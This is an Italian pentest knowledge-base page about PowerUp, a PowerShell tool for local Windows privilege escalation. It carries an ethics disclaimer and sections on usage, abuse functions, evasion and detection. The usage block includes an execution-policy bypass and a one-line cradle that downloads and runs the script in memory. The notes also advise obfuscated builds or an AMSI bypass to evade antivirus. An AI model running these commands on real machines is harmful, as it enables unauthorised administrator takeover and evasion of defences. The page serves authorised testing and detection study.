---
tipo: entita
tag: [tool, windows]
fase: 3
fonti: 2
aggiornato: 2026-06-21
stato: maturo
aliases: ["PowerUp"]
---

# PowerUp

> **Nota etica**: solo lab autorizzati o engagement con permesso scritto.

## In breve
**PowerUp** è uno script **PowerShell** (parte di PowerSploit) per la **privilege escalation locale su Windows**: enumera in automatico le *misconfigurazioni* comuni che portano da utente a `SYSTEM` e, per molte, offre la funzione di **abuso** pronta. È l'equivalente Windows-nativo di [[PEAS|WinPEAS]] sul lato "controlli di servizio/registro", utile quando puoi eseguire PowerShell ma non vuoi caricare binari. Vedi [[Privilege Escalation Windows]] per il quadro dei vettori.

## Uso
```powershell
# Carica in memoria (evita di scrivere su disco)
powershell -ep bypass
Import-Module .\PowerUp.ps1     # oppure: IEX (New-Object Net.WebClient).DownloadString('http://.../PowerUp.ps1')

# Controllo completo: lancia tutti i check e segnala ciò che è sfruttabile
Invoke-AllChecks
```

## Cosa cerca (e abusa)
| Check | Vettore | Funzione di abuso |
|---|---|---|
| `Get-ServiceUnquoted` | percorso servizio non quotato con spazi | `Write-ServiceBinary` |
| `Get-ModifiableServiceFile` | binario del servizio scrivibile | sostituzione binario |
| `Get-ModifiableService` | config servizio modificabile (`binPath`) | `Set-ServiceBinary` |
| `Get-RegistryAlwaysInstallElevated` | **AlwaysInstallElevated** = 1 | `Write-UserAddMSI` |
| `Get-ModifiableScheduledTaskFile` | task pianificato con file scrivibile | sostituzione |
| `Get-UnattendedInstallFile` | credenziali in `unattend.xml`/`sysprep` | lettura |
| `Get-ProcessTokenPrivilege` | privilegi token (`SeImpersonate`...) | → Potato attacks |

Per molti check, PowerUp può creare al volo un servizio/MSI che **aggiunge un utente admin** o esegue un comando.

## Note operative
- Spesso flaggato da AV/AMSI: usare versioni offuscate o l'AMSI bypass in lab; in alternativa [[PEAS|WinPEAS]] o controlli manuali.
- Solo **enumerazione + abuso locale**: per la parte AD usa [[BloodHound]]/[[NetExec]].

## Detection
- Creazione/modifica servizi (**Event 7045/7040**), nuovi account locali (**4720**), MSI con privilegi elevati.
- MITRE: **T1547/T1543** (servizi), **T1548** (abuso meccanismi di elevazione).

## Collegamenti
- [[Privilege Escalation Windows]] — vettori che PowerUp automatizza
- [[PEAS]] — alternativa (WinPEAS) · [[PowerShell]]
- [[BloodHound]] · [[NetExec]] — lato dominio

## Fonti
- PowerSploit — PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- HackTricks — Windows local privesc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
